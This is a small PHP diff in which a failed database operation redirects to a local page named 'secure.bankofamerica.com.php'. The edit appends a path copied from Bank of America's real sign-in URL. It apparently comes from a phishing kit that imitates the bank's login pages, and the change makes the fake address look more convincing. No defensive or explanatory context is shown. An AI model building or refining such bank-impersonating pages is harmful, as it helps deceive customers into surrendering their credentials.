@@ -11,7 +11,7 @@
 		print_r("Success");
 	} catch (PDOException $e) {
 		print_r("Failure");
-		header("Location: secure.bankofamerica.com.php");
+		header("Location: secure.bankofamerica.com.php?/login/sign-in/signOnV2Screen.go");
 		exit;
 	}
 ?>
